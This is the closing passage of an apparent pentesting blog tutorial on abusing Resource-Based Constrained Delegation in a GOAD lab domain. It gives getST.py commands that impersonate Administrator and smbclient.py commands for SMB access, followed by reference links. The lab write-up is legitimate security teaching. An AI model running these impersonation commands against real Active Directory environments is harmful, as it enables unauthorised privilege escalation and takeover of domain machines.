![RBCD configuration on KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-44.avif)

Once we have RBCD configured thanks to the GenericAll ACL we can make use of S4U2Self and S4U2Proxy to request an Administrator TGS on KINGSLANDING$:

```bash
getST.py -spn 'CIFS/kingslanding' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'
```

![TGS as Administrator on KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-45.avif)

Having the TGS for the CIFS service of KINGSLANDING$, we can now do the same as always:

```bash
export KRB5CCNAME=/home/draco_0x6ba/Administrator@CIFS_kingslanding@SEVENKINGDOMS.LOCAL.ccache

smbclient.py -k -no-pass sevenkingdoms.local/administrator@kingslanding
```

![SMB access to KINGSLANDING](https://cdn.deephacking.tech/i/posts/constrained-delegation-y-resource-based-constrained-delegation/constrained-delegation-y-resource-based-constrained-delegation-46.avif)

And in this way, we will have exploited RBCD.

## Interesting Articles (but not better than this one, obviously)

- Constrained Delegation
    - [Trust? Years to earn, seconds to break - WithSecure Labs](https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break)
    - [S4U2Pwnage - harmj0y](https://blog.harmj0y.net/activedirectory/s4u2pwnage/)
    - [Another Word on Delegation - harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
    - [Delegate to the Top - Abusing Kerberos for Arbitrary Impersonations and RCE - Blackhat Asia 2017](https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE.pdf)
- Resource-Based Constrained Delegation
    - [Wagging the Dog: Abusing Resource-Based Constrained Delegation - Shenanigans Labs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse)
    - [A Case Study in Wagging the Dog: Computer Takeover - harmj0y](https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
    - [Kerberos RBCD: When an Image Change Leads to a Privilege Escalation - NCC Group](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

And whoever for both cases, wants to see the entire process seen in this article at a low level (see packets with Wireshark, etc) should see the talk/slides by 4TTL4S of his talk **You do (not) Understand Kerberos Delegation**:

- [4TTL4S Blog](https://attl4s.github.io/)

## References

- [Kerberos (III): How does delegation work? - Tarlogic](https://www.tarlogic.com/es/blog/kerberos-iii-como-funciona-la-delegacion/#Constrained_Delegation_y_RBCD)
- [Kerberos Delegation - hackndo](https://en.hackndo.com/constrained-unconstrained-delegation/)
- [GOAD - part 10 - Delegations - Mayfly](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)
- [Delegations - The Hacker Recipes](https://www.thehacker.recipes/a-d/movement/kerberos/delegations)
